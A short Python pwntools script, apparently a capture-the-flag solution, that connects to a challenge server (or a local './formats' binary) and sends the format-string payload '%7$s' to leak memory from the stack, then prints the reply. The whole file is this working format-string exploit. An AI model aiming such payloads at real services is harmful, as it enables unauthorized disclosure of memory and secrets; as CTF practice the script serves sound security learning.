from pwn import *

local = False
host = 'cyberyoddha.baycyber.net'
port = 10005

if local == True:
	p = process('./formats')
else:
	p = remote(host, port)

payload = b'%7$s'

p.sendline(payload)

print(p.recv(4096))
